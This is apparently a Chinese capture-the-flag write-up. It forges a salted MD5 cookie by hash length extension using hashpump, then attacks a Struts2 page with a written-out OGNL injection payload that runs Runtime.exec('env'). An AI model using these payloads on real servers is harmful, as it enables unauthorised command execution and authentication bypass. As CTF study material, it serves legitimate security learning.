# 题目

```php
<?php
highlight_file(__FILE__);
include "./secret_key.php";
include "./salt.php";
//$salt = XXXXXXXXXXXXXX // the salt include 14 characters
//md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df
@$username = urldecode($_POST["username"]);
@$password = urldecode($_POST["password"]);
if (!empty($_COOKIE["digest"])) {
    if ($username === "admin" && $password != "root") {
         if ($_COOKIE["digest"] === md5($salt.$username.$password)) {
            die ("The secret_key is ". $secret_key);
        }
        else {
            die ("Your cookies don't match up! STOP HACKING THIS SITE.");
        }
    }
    else {
        die ("no no no");
    }
}
```

```bash
# $salt长度为14，并且知道md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df
# 要想得到jwt，需要设置key为digest的cookie，并且username为admin，password不为root
./hashpump -s e6ccbf12de9d33ec27a5bcfb6a3293df -d adminroot -k 14 -a aaa
# adminroot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00aaa
```

其中 e73c228e8b50e5b3bcc6538c834e0f09 就是我们 cookie 中 digest 的值，

由于源码中的判断条件是 `$_COOKIE["digest"] === md5($salt.$username.$password)`

并且\$username=admin，因此 password 需要去掉 admin,即\$password 为

`root\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00aaa`

```bash
# url 编码
root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00aaa
# burp中传递值为
username=admin&password=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00aaa
```

得到 jwt key, 转到 struts 页面了

方式 1.用 Struts2Scan-main,服务器信息可能要设置全局 Cookie 值(可能不用),可能还要加 jsessionid.执行命令 env

http://localhost/admin/user.action;jsessionid=CDA99EFEFEFE9

方式 2.访问

```bash
'+%2b+(%23_memberAccess["allowStaticMethodAccess"]%3dtrue,%23foo%3dnew+java.lang.Boolean("false")+,%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo,%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('env').getInputStream()))+%2b+'
```

